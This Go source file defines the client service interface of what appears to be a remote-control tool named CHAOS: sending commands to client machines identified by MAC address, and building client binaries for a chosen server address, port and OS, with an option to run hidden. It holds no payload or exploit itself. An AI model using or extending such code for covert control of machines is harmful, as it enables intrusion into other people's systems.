package client

import (
	"context"
	"errors"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
)

type (
	SendCommandInput struct {
		MacAddress string
		Request    string
	}
	SendCommandOutput struct {
		Response string
	}

	BuildClientBinaryInput struct {
		ServerAddress, ServerPort, Filename string
		RunHidden                           bool
		OSTarget                            system.OSType
	}
)

var (
	ErrInvalidServerAddress = errors.New("the server address provided is invalid")
	ErrInvalidServerPort    = errors.New("the server port provided is invalid")
)

type Service interface {
	SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error)
	BuildClient(BuildClientBinaryInput) (string, error)
}
